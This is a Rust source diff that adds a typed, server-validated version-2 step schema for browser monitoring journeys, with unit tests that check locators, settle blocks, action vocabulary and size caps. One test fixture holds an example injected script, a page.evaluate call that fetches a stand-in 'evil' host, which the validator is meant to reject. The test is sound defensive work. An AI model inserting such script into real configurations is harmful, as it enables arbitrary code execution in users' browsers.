@@ -619,6 +619,119 @@ pub struct SshAuth {
     pub secret: String,
 }
 
+// ── Version-2 step record ─────────────────────────────────────────────────────
+//
+// v1 steps are untyped JSON with a single `selector` and a recorder-stamped
+// `timeout_ms`. v2 replaces that with this typed, server-validated structure.
+//
+// The envelope is defined ONCE, complete, even though later phases populate
+// parts of it: `settle.navigation` (Phase 3), `settle.responses` (Phase 4),
+// `assertion` / `optional` / `always_run` (Phase 5). Bumping `steps_version` per
+// phase would break deployment skew — `deny_unknown_fields` means an additive
+// field from a newer recorder would be refused by an older server. Every block
+// except `locator` is optional, with a defined absent-behaviour, which is what
+// lets the phases ship independently.
+
+/// One way to find an element. Ordered most-stable-first inside a bundle.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
+#[serde(deny_unknown_fields)]
+pub struct LocatorCandidate {
+    /// "test_attribute" | "role" | "text" | "css" | "xpath"
+    pub kind: String,
+    pub value: String,
+}
+
+/// Every way the recorder found to identify one element, plus an optional
+/// author pin. Candidates are machine-derived evidence and read-only in the UI;
+/// `user_override` is the only channel for author intent, which is what makes
+/// "never heal a pinned step" fall out for free.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(deny_unknown_fields)]
+pub struct StepLocator {
+    #[serde(default)]
+    pub candidates: Vec<LocatorCandidate>,
+    /// When set, used exclusively — never falls back to `candidates`.
+    #[serde(default)]
+    pub user_override: Option<LocatorCandidate>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct SettleNavigation {
+    pub url_pattern: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct SettleResponse {
+    pub url_pattern: String,
+    #[serde(default)]
+    pub method: Option<String>,
+    /// Advisory by default: a signal that never fires annotates the step rather
+    /// than failing it. Only an author may set this — the recorder always emits
+    /// `false`.
+    #[serde(default)]
+    pub required: bool,
+}
+
+/// What the page demonstrably did after this step, observed during recording and
+/// replayed as explicit wait conditions.
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
+#[serde(deny_unknown_fields)]
+pub struct StepSettle {
+    #[serde(default)]
+    pub navigation: Option<SettleNavigation>,
+    #[serde(default)]
+    pub responses: Vec<SettleResponse>,
+    /// How long settling actually took while recording. Used for reporting
+    /// ("normally ~2s, today 40s") — never as a timeout.
+    #[serde(default)]
+    pub observed_duration_ms: Option<u64>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct StepAssertion {
+    pub kind: String,
+    #[serde(default)]
+    pub expected: Option<String>,
+    #[serde(default)]
+    pub attribute: Option<String>,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct BrowserStepV2 {
+    pub id: String,
+    pub action: String,
+    #[serde(default)]
+    pub name: Option<String>,
+    #[serde(default)]
+    pub url: Option<String>,
+    #[serde(default)]
+    pub locator: Option<StepLocator>,
+    #[serde(default)]
+    pub value: Option<String>,
+    #[serde(default)]
+    pub key: Option<String>,
+    #[serde(default)]
+    pub files: Option<Vec<String>>,
+    #[serde(default)]
+    pub settle: Option<StepSettle>,
+    #[serde(default)]
+    pub assertion: Option<StepAssertion>,
+    /// Failure skips the step and the run continues (cookie banners, popups).
+    #[serde(default)]
+    pub optional: bool,
+    /// Runs even after an earlier step failed (logout, cleanup).
+    #[serde(default)]
+    pub always_run: bool,
+    /// `None` means "use the runner's per-category default". An explicit value
+    /// is a deliberate author choice, validated into 100..=60000.
+    #[serde(default)]
+    pub timeout_ms: Option<u32>,
+}
+
 /// A (browser, device) pair for browser monitor fan-out.
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
 pub struct BrowserDevice {
@@ -633,6 +746,10 @@ pub struct BrowserConfig {
     #[serde(default = "default_browser_devices")]
     pub browser_devices: Vec<BrowserDevice>,
     pub runtime: Option<String>,
+    /// Which step schema `steps` uses. Explicit, never inferred from shape.
+    /// Absent means 1, so every stored monitor reads back as v1.
+    #[serde(default = "default_steps_version")]
+    pub steps_version: u8,
     #[serde(default)]
     pub steps: Vec<serde_json::Value>,
     #[serde(default)]
@@ -688,6 +805,10 @@ fn default_timeout_ms() -> u32 {
 
 fn default_browser_timeout_ms() -> u32 {
     30_000
+}
+
+fn default_steps_version() -> u8 {
+    1
 }
 
 fn default_tls_port() -> u16 {
@@ -800,8 +921,37 @@ const MAX_JOURNEY_BUDGET_MS: u32 = 900_000;
 /// `journey_budget_ms` further requires re-deriving all three together.
 const BROWSER_LEASE_SECS: i64 = 900;
 
+/// The complete v2 action vocabulary — exactly Playwright's recorder action
+/// model, minus what a monitor cannot use.
+///
+/// Deliberately excludes `hover`, `scroll`, `wait`/`waitFor` and `screenshot`:
+/// upstream `ActionName` has no counterpart for any of them, so the recorder
+/// never emitted one and the extension player could never replay one. They
+/// entered journeys only through the manual step editor, and using one aborted
+/// replay entirely. `type` and `keydown` are dropped as redundant aliases of
+/// `fill` and `press`.
+///
+/// Because this set is drawn from Playwright's own model, every stored v2 step
+/// is executable by both the probe and the extension player by construction.
+const V2_STEP_ACTIONS: &[&str] = &[
+    "navigate", "click", "fill", "press", "select", "check", "uncheck", "upload", "assert",
+];
+
+/// v2 actions that operate on an element and therefore need a locator.
+const V2_ELEMENT_ACTIONS: &[&str] = &[
+    "click", "fill", "press", "select", "check", "uncheck", "upload", "assert",
+];
+
 const MAX_STEPS: usize = 50;
 const MAX_STEPS_JSON_BYTES: usize = 100_000;
+/// v2 steps carry up to 5 locator candidates and 5 settle patterns each, roughly
+/// 3-4x a v1 step. A maximal 50-step journey lands near 60KB; the cap is set well
+/// clear of that. The `config` column is already JSON (jsonb on PostgreSQL), and
+/// steps travel over the HTTP resolve/ack bodies rather than the Lambda invoke
+/// payload, so neither storage nor transport needs changing.
+const MAX_STEPS_JSON_BYTES_V2: usize = 262_144;
+const MAX_LOCATOR_CANDIDATES: usize = 5;
+const MAX_SETTLE_RESPONSES: usize = 5;
 const MAX_TAGS: usize = 20;
 const MAX_VARIABLES: usize = 50;
 const MAX_BROWSER_DEVICE_COMBOS: usize = 12;
@@ -1156,6 +1306,102 @@ impl Synthetic {
     }
 }
 
+/// Validates version-2 steps: typed deserialization plus the structural rules
+/// that deserialization cannot express.
+///
+/// Deserialization does most of the work. Every v2 struct is
+/// `deny_unknown_fields`, so a step carrying `code` — or anything else the
+/// schema does not know — is refused here. That is what closes the
+/// arbitrary-JavaScript path at the schema level rather than relying on the
+/// runner to ignore it.
+fn validate_v2_steps(steps: &[serde_json::Value]) -> Result<(), String> {
+    let mut seen_ids = std::collections::HashSet::new();
+
+    for (i, raw) in steps.iter().enumerate() {
+        let step: BrowserStepV2 = serde_json::from_value(raw.clone())
+            .map_err(|e| format!("config.steps[{i}]: {e}"))?;
+
+        if step.id.is_empty() {
+            return Err(format!("config.steps[{i}]: 'id' must not be empty"));
+        }
+        if !seen_ids.insert(step.id.clone()) {
+            return Err(format!(
+                "config.steps[{i}]: duplicate step id '{}'",
+                step.id
+            ));
+        }
+
+        if !V2_STEP_ACTIONS.contains(&step.action.as_str()) {
+            return Err(format!(
+                "config.steps[{i}]: action '{}' is not valid in steps_version 2 (valid: {}). \
+                 hover, scroll, wait and screenshot have no equivalent in the recorder's action \
+                 model and cannot be replayed; type and keydown are aliases of fill and press.",
+                step.action,
+                V2_STEP_ACTIONS.join(", ")
+            ));
+        }
+
+        // The probe opens about:blank and never auto-navigates.
+        if i == 0 && step.action != "navigate" {
+            return Err(format!(
+                "config.steps[0]: first step must be 'navigate', got '{}'",
+                step.action
+            ));
+        }
+
+        if step.action == "navigate" {
+            let url = step
+                .url
+                .as_deref()
+                .ok_or_else(|| format!("config.steps[{i}]: navigate step missing 'url'"))?;
+            validate_http_url(&format!("config.steps[{i}].url"), url)?;
+        }
+
+        if V2_ELEMENT_ACTIONS.contains(&step.action.as_str()) {
+            let locator = step.locator.as_ref().ok_or_else(|| {
+                format!("config.steps[{i}]: '{}' step requires a 'locator'", step.action)
+            })?;
+            if locator.candidates.is_empty() && locator.user_override.is_none() {
+                return Err(format!(
+                    "config.steps[{i}].locator: needs at least one candidate or a user_override"
+                ));
+            }
+            if locator.candidates.len() > MAX_LOCATOR_CANDIDATES {
+                return Err(format!(
+                    "config.steps[{i}].locator.candidates: too many ({} > {MAX_LOCATOR_CANDIDATES})",
+                    locator.candidates.len()
+                ));
+            }
+        }
+
+        if (step.action == "fill" || step.action == "select") && step.value.is_none() {
+            return Err(format!(
+                "config.steps[{i}]: '{}' step requires a 'value'",
+                step.action
+            ));
+        }
+
+        if let Some(settle) = &step.settle
+            && settle.responses.len() > MAX_SETTLE_RESPONSES
+        {
+            return Err(format!(
+                "config.steps[{i}].settle.responses: too many ({} > {MAX_SETTLE_RESPONSES})",
+                settle.responses.len()
+            ));
+        }
+
+        if let Some(timeout) = step.timeout_ms
+            && !(100..=60_000).contains(&timeout)
+        {
+            return Err(format!(
+                "config.steps[{i}].timeout_ms: must be 100..=60000, got {timeout}"
+            ));
+        }
+    }
+
+    Ok(())
+}
+
 fn validate_browser_config(
     cfg: &BrowserConfig,
     frequency: &SyntheticFrequency,
@@ -1202,10 +1448,27 @@ fn validate_browser_config(
     let steps_bytes = serde_json::to_string(&cfg.steps)
         .map(|s| s.len())
         .unwrap_or(0);
-    if steps_bytes > MAX_STEPS_JSON_BYTES {
+    let max_bytes = if cfg.steps_version >= 2 {
+        MAX_STEPS_JSON_BYTES_V2
+    } else {
+        MAX_STEPS_JSON_BYTES
+    };
+    if steps_bytes > max_bytes {
         return Err(format!(
-            "config.steps: serialized steps too large ({steps_bytes} > {MAX_STEPS_JSON_BYTES} bytes)"
+            "config.steps: serialized steps too large ({steps_bytes} > {max_bytes} bytes)"
         ));
+    }
+
+    // v2 steps are typed and validated separately; v1 keeps its historical
+    // untyped path byte-for-byte so no stored monitor changes behaviour.
+    if cfg.steps_version >= 2 {
+        validate_v2_steps(&cfg.steps)?;
+        return validate_browser_devices_and_schedule(
+            cfg,
+            frequency,
+            allowed_browsers,
+            allowed_devices,
+        );
     }
 
     let mut seen_ids = std::collections::HashSet::new();
@@ -1271,6 +1534,17 @@ fn validate_browser_config(
         }
     }
 
+    validate_browser_devices_and_schedule(cfg, frequency, allowed_browsers, allowed_devices)
+}
+
+/// Shared by the v1 and v2 step paths — everything about a browser config that
+/// is not the steps themselves.
+fn validate_browser_devices_and_schedule(
+    cfg: &BrowserConfig,
+    frequency: &SyntheticFrequency,
+    allowed_browsers: &[String],
+    allowed_devices: &[String],
+) -> Result<(), String> {
     // ── browser × device combos ────────────────────────────────────────────
     if cfg.browser_devices.is_empty() {
         return Err(
@@ -1622,6 +1896,253 @@ mod tests {
                 .validate(&locs, &brs, &devs, true)
                 .is_ok()
         );
+    }
+
+    // ── Version-2 steps (spec Phase 2, P2.1/P2.2) ────────────────────────────
+    // v2 replaces the untyped step blob with a typed, server-validated one. The
+    // envelope is defined ONCE with its complete field set, and later phases
+    // populate blocks that ship optional from day one (settle, assertion,
+    // optional/always_run). Bumping the version per phase would break
+    // deployment skew: v2 rejects unknown fields, so an additive field from a
+    // newer recorder would be refused by an older server.
+
+    fn v2_synthetic(steps: serde_json::Value) -> Synthetic {
+        let mut s = valid_browser_synthetic();
+        s.config["steps_version"] = serde_json::json!(2);
+        s.config["steps"] = steps;
+        s
+    }
+
+    fn v2_click_step() -> serde_json::Value {
+        serde_json::json!({
+            "id": "s2",
+            "action": "click",
+            "name": "Sign In",
+            "locator": {
+                "candidates": [
+                    { "kind": "test_attribute", "value": "[data-test=\"login-sign-in\"]" },
+                    { "kind": "role", "value": "role=button[name=\"Sign In\"]" }
+                ]
+            }
+        })
+    }
+
+    fn v2_nav_step() -> serde_json::Value {
+        serde_json::json!({
+            "id": "s1",
+            "action": "navigate",
+            "name": "Open",
+            "url": "https://example.com"
+        })
+    }
+
+    #[test]
+    fn test_v2_minimal_journey_accepted() {
+        let (locs, brs, devs) = allowed();
+        let s = v2_synthetic(serde_json::json!([v2_nav_step(), v2_click_step()]));
+        assert!(s.validate(&locs, &brs, &devs, true).is_ok());
+    }
+
+    #[test]
+    fn test_v1_unchanged_when_steps_version_absent() {
+        // Regression guard: every stored monitor must keep validating exactly as
+        // before. v1 steps carry a bare `selector` and no locator bundle.
+        let (locs, brs, devs) = allowed();
+        let s = valid_browser_synthetic();
+        assert!(s.config.get("steps_version").is_none());
+        assert!(s.validate(&locs, &brs, &devs, true).is_ok());
+    }
+
+    #[test]
+    fn test_v2_rejects_unknown_fields() {
+        // This is the mechanism that closes the arbitrary-code hole: anything
+        // the schema does not know about is refused, so `code` cannot ride along
+        // under a different name either.
+        let (locs, brs, devs) = allowed();
+        let mut step = v2_click_step();
+        step["surprise"] = serde_json::json!("hello");
+        let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+        let err = s.validate(&locs, &brs, &devs, true).unwrap_err();
+        assert!(err.contains("surprise"), "{err}");
+    }
+
+    #[test]
+    fn test_v2_rejects_code_field() {
+        let (locs, brs, devs) = allowed();
+        let mut step = v2_click_step();
+        step["code"] = serde_json::json!("await page.evaluate(() => fetch('http://evil'))");
+        let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+        let err = s.validate(&locs, &brs, &devs, true).unwrap_err();
+        assert!(err.contains("code"), "{err}");
+    }
+
+    #[test]
+    fn test_v2_accepts_exactly_the_nine_action_vocabulary() {
+        let (locs, brs, devs) = allowed();
+        for action in ["click", "fill", "press", "select", "check", "uncheck", "upload"] {
+            let mut step = v2_click_step();
+            step["action"] = serde_json::json!(action);
+            if action == "fill" || action == "select" {
+                step["value"] = serde_json::json!("x");
+            }
+            let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+            assert!(
+                s.validate(&locs, &brs, &devs, true).is_ok(),
+                "{action} should be accepted: {:?}",
+                s.validate(&locs, &brs, &devs, true)
+            );
+        }
+    }
+
+    #[test]
+    fn test_v2_rejects_retired_actions() {
+        // Upstream Playwright's recorder action model has no counterpart for any
+        // of these, so the recorder never emitted one and the player could never
+        // replay one. `type`/`keydown` are redundant aliases of fill/press.
+        let (locs, brs, devs) = allowed();
+        for action in ["hover", "scroll", "wait", "waitFor", "screenshot", "type", "keydown"] {
+            let mut step = v2_click_step();
+            step["action"] = serde_json::json!(action);
+            let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+            let err = s.validate(&locs, &brs, &devs, true).unwrap_err();
+            assert!(
+                err.contains(action) || err.contains("action"),
+                "{action} should be rejected in v2, got: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_v1_still_accepts_retired_actions_on_read() {
+        // Q-10 / D-6: stored monitors keep EXECUTING these. Only create/update
+        // rejects them, which is enforced separately — validation of a v1 shape
+        // must not start failing for monitors that already exist.
+        let (locs, brs, devs) = allowed();
+        let mut s = valid_browser_synthetic();
+        s.config["steps"] = serde_json::json!([
+            { "id": "s1", "action": "navigate", "url": "https://example.com" },
+            { "id": "s2", "action": "wait", "timeout_ms": 30000 }
+        ]);
+        assert!(s.validate(&locs, &brs, &devs, true).is_ok());
+    }
+
+    #[test]
+    fn test_v2_element_action_requires_a_locator() {
+        let (locs, brs, devs) = allowed();
+        let mut step = v2_click_step();
+        step.as_object_mut().unwrap().remove("locator");
+        let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+        let err = s.validate(&locs, &brs, &devs, true).unwrap_err();
+        assert!(err.contains("locator"), "{err}");
+    }
+
+    #[test]
+    fn test_v2_user_override_satisfies_the_locator_requirement() {
+        let (locs, brs, devs) = allowed();
+        let step = serde_json::json!({
+            "id": "s2",
+            "action": "click",
+            "name": "Sign In",
+            "locator": {
+                "candidates": [],
+                "user_override": { "kind": "css", "value": "#pinned" }
+            }
+        });
+        let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+        assert!(s.validate(&locs, &brs, &devs, true).is_ok());
+    }
+
+    #[test]
+    fn test_v2_caps_locator_candidates_at_five() {
+        let (locs, brs, devs) = allowed();
+        let candidates: Vec<_> = (0..6)
+            .map(|i| serde_json::json!({ "kind": "css", "value": format!("#c{i}") }))
+            .collect();
+        let mut step = v2_click_step();
+        step["locator"]["candidates"] = serde_json::json!(candidates);
+        let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+        let err = s.validate(&locs, &brs, &devs, true).unwrap_err();
+        assert!(err.contains("candidates"), "{err}");
+    }
+
+    #[test]
+    fn test_v2_caps_settle_response_patterns_at_five() {
+        let (locs, brs, devs) = allowed();
+        let responses: Vec<_> = (0..6)
+            .map(|i| serde_json::json!({ "url_pattern": format!("**/api/{i}") }))
+            .collect();
+        let mut step = v2_click_step();
+        step["settle"] = serde_json::json!({ "responses": responses });
+        let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+        let err = s.validate(&locs, &brs, &devs, true).unwrap_err();
+        assert!(err.contains("responses"), "{err}");
+    }
+
+    #[test]
+    fn test_v2_accepts_a_full_settle_block() {
+        // Defined in Phase 2, populated by Phases 3 and 4. It must validate now
+        // so a newer recorder is never refused by an older server (spec V-2).
+        let (locs, brs, devs) = allowed();
+        let mut step = v2_click_step();
+        step["settle"] = serde_json::json!({
+            "navigation": { "url_pattern": "**/web/**" },
+            "responses": [ { "url_pattern": "**/auth/login", "method": "POST", "required": false } ],
+            "observed_duration_ms": 2300
+        });
+        let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+        assert!(s.validate(&locs, &brs, &devs, true).is_ok());
+    }
+
+    #[test]
+    fn test_v2_accepts_assertion_and_flow_control_blocks() {
+        let (locs, brs, devs) = allowed();
+        let step = serde_json::json!({
+            "id": "s3",
+            "action": "assert",
+            "name": "Profile visible",
+            "locator": { "candidates": [ { "kind": "test_attribute", "value": "[data-test=\"p\"]" } ] },
+            "assertion": { "kind": "element_visible" },
+            "optional": true,
+            "always_run": false
+        });
+        let s = v2_synthetic(serde_json::json!([v2_nav_step(), step]));
+        assert!(s.validate(&locs, &brs, &devs, true).is_ok());
+    }
+
+    #[test]
+    fn test_v2_first_step_must_be_navigate() {
+        let (locs, brs, devs) = allowed();
+        let s = v2_synthetic(serde_json::json!([v2_click_step()]));
+        let err = s.validate(&locs, &brs, &devs, true).unwrap_err();
+        assert!(err.contains("navigate"), "{err}");
+    }
+
+    #[test]
+    fn test_v2_raises_the_steps_size_cap() {
+        // v2 steps are heavier (up to 5 candidates + settle patterns each), so
+        // the cap moves 100_000 -> 262_144. A payload between the two must be
+        // rejected as v1 and accepted as v2.
+        let (locs, brs, devs) = allowed();
+        let filler = "x".repeat(150_000);
+        let big_steps = serde_json::json!([
+            v2_nav_step(),
+            {
+                "id": "s2",
+                "action": "click",
+                "name": filler,
+                "locator": { "candidates": [ { "kind": "css", "value": "#a" } ] }
+            }
+        ]);
+        let v2 = v2_synthetic(big_steps.clone());
+        assert!(v2.validate(&locs, &brs, &devs, true).is_ok(), "v2 should allow ~150KB");
+
+        let mut v1 = valid_browser_synthetic();
+        v1.config["steps"] = serde_json::json!([
+            { "id": "s1", "action": "navigate", "url": "https://example.com" },
+            { "id": "s2", "action": "click", "selector": "#a", "name": "x".repeat(150_000) }
+        ]);
+        let err = v1.validate(&locs, &brs, &devs, true).unwrap_err();
+        assert!(err.contains("too large"), "{err}");
     }
 
     // ── Journey budget vs. job lease (spec P1.5.4 / T1-5) ────────────────────
